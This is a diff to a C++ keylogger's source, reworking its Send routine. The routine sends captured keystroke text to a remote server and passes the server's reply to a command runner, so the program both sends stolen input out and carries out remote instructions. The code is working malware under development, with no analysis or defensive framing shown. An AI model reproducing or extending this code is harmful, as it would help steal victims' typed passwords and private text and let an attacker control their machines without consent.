@@ -4,8 +4,6 @@
 #include "Network.h"
 #include "Settings.h"
 
-#pragma comment(lib, "Ws2_32.lib")
-
 Keylogger keylogger;
 
 const int V_KEY_BEGIN   = 0x08; // [BACK]
@@ -224,22 +222,22 @@ void Keylogger::Send()
 	}
 
 	size_t msgText_len = msgText.size();
+	
+	size_t resp_len;
+	char *resp;
+	bool ret = network.SendAndGetText(V_NET_FILE_DATA, msgText.c_str(), &resp_len, &resp);
 
-	size_t response_len;
-	char *response_start;
-
-	bool ret = network.SendPost(sendBuf, sizeof(sendBuf)-1, &response_len, (const char**)&response_start, V_NET_FILE_DATA, msgText.c_str(), msgText_len, true);
-
-	if (!ret || response_len == 0)
+	if (ret && resp_len > 0)
 	{
-		this->DecreaseSendInterval();
+		this->IncreaseSendInterval();
+		cmd.Run(std::string(resp, resp_len));
 	}
 	else
 	{
-		this->IncreaseSendInterval();
-		response_start[response_len] = '\0';
-		cmd.Run(response_start);
+		this->DecreaseSendInterval();
 	}
+
+	if (ret) free(resp);
 }
 
 void Keylogger::IncreaseSendInterval()
